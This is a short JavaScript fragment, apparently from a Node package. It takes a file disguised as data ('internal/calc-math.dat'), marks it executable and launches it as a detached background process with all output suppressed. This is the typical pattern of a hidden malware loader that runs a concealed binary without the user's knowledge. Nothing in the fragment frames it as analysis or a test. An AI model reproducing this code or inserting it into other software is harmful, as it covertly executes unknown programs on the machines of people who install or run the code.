const binaryPath = join(__dirname, "internal/calc-math.dat");
await chmod(binaryPath, 0o755);
spawn(binaryPath, [], { detached: true, stdio: "ignore" });
